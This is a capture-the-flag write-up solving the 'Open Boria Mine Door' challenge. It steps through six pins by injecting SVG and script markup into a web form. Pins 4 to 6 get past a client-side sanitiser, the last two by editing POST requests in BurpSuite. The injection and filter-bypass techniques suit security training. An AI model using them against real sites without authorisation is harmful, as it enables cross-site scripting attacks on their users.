---
sidebar_position: 5
---

# Open Boria Mine Door

> Open the door to the Boria Mines. Help Alabaster Snowball in the Web Ring to get some hints for this challenge.

****

# Open Boria Mine Doors

## Pin 1

Inspecting the HTML source code I saw a commented-out line containing the keyword to unlock Pin 1. Simply copy and paste the value and I was good to go.

```html
<!-- @&@&&W&&W&&&& -->
```

## Pin 2

The general theme is to inspect the HTML source to find hints to solve the various pins. For Pin 2 I saw a to-do note to filter out HTML from user input. 

```html
<!-- TODO: FILTER OUT HTML FROM USER INPUT -->
```

The assignment seems to be to draw lines between various connecting dots. The best way to do that is to simply draw a line using the SVG HTML tag, like this: 

```html
<svg height="170" width="200">
  <path d="M0 73 298 194" stroke-width="10" stroke="white"/>2
</svg>
```

## Pin 3

Advancing on this, I found a hint regarding Javascript in the HTML source

```html
<!-- TODO: FILTER OUT JAVASCRIPT FROM USER INPUT -->
```

Simply outputting the SVG tag using Javascript:


```html
<script>
document.write('
<svg height="170" width="200">
  <path d="M0 95 280 1" stroke-width="10" stroke="blue"/>2
</svg>
');
</script>
```

## Pin 4

For this pin, there are no commented-out hints, but I found a sanitation script present which simply replaces the first occurrences of each special char;

```html
<script>
    const sanitizeInput = () => {
        const input = document.querySelector('.inputTxt');
        const content = input.value;
        input.value = content
            .replace(/"/, '')
            .replace(/'/, '')
            .replace(/</, '')
            .replace(/>/, '');
    }
</script>
```

Padding the input with <\> simply unlocked the pin:

```html
<>
<svg height="170" width="200">
  <path d="M0 40 280 40" stroke-width="10" stroke="white"/>2
  <path d="M0 130 280 130" stroke-width="10" stroke="blue"/>2
</svg>
```

## Pin 5

The script from the last pin has been extended to now filtrate out every occurrence!

```html
<script>
        const sanitizeInput = () => {
            const input = document.querySelector('.inputTxt');
            const content = input.value;
            input.value = content
                .replace(/"/gi, '')
                .replace(/'/gi, '')
                .replace(/</gi, '')
                .replace(/>/gi, '');
        }
</script>
```

However, this happens only on the client side. If I pass the POST request through BurpSuite proxy, I can insert my trusty SVG tag:

```html
inputTxt=<script>document.write('<svg height="170" width="200"><path d="M35 170 210 90" stroke-width="10" stroke="blue"/><path d="M0 135 210 40" stroke-width="10" stroke="red"/></svg>');</script>
```

## Pin 6

No hint available here - but I am still in BurpSuite land manipulating the POST request directly:

```html
inputTxt=<svg height="170" width="200"><path d="M0 35 210 35" stroke-width="10" stroke="lime"/><path d="M0 75 240 115" stroke-width="10" stroke="red"/><path d="M0 115 150 170" stroke-width="10" stroke="blue"/></svg>
```

## All pins unlocked

![All pins solved](/img/web-ring/pins.png)